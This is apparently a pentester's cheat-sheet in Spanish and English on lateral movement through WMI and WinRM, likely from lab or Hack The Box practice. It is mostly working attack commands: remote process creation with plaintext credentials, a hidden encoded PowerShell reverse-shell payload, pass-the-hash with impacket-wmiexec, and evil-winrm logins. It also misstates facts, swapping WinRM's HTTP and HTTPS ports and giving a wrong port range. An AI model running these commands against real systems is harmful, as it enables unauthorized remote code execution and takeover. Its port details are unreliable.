## DESCRIPTION

Windows Management Instrumentation (WMI)  Remote Procedure Calls (RPC)2 over port 135 for remote access and uses a higher-range port (19152-65535) for session data.

As an alternative method to WMI for remote management, WinRM can be employed for remote hosts management. WinRM is the Microsoft version of the WS-Management8 protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP.
#### Mas información
* https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
* https://www.hackplayers.com/2021/03/entendiendo-los-ataques-con-wmi.html

## EXPLOITATION

### OPTION 1: WMI DESDE WINDOWS

```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```


### OPTION 2: WMI DESDE WINDOWS POWERSHELL

```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```


### OPTION 2: WMI DESDE KALI
```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E 
```


## WINRM

### OPTION 1: WINRM DESDE WINDOWS POWERSHELL

```
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```

### OPTION 12: WINRM DESDE KALI

```
evil-winrm -i 192.168.241.70 -u backupuser -p 'DonovanJadeKnight1'
```

## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 